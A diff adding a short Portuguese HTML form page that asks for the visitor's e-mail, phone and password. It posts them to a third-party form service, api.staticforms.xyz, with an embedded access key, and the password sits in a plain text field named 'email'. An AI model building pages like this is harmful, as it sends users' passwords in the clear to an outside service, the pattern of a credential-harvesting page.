@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario</title>
+    <link rel="stylesheet" href="index.css">
+</head>
+<body>
+    <section class="form-container">
+        <div class="container">
+            <form action="https://api.staticforms.xyz/submit" method="post">
+                <h1>Coloque seu e-mail, senha e telefone</h1>
+                <div class="input-single">
+                    <input type="text"  id="nome-box" name="name" class="input"
+                    autocomplete="off" required>
+                    <label for="nome-box">Seu e-mail</label>
+                </div>
+
+                <div class="input-single">
+                    <input type="text"  id="tell-box" name="phone" class="input"autocomplete="off" required>
+
+                    <label for="tell-box">Seu telefone</label>
+                </div>
+
+                <div class="input-single">
+                    <input type="text" name="email" id="senha-box" class="input"autocomplete="off" required>
+
+                    <label for="senha-box">Sua senha</label>
+                </div>
+
+                <div class="btn">
+                    <input type="submit" value="Enviar">
+                </div>
+                <input type="hidden" name="accessKey" value="befc1bc1-cb34-4a39-862e-ba432c36bc80">
+                <input type="hidden" name="redirectTo" value="http://127.0.0.1:5500/redirect.html">
+            </form>
+        </div>
+    </section>
+</body>
+</html>
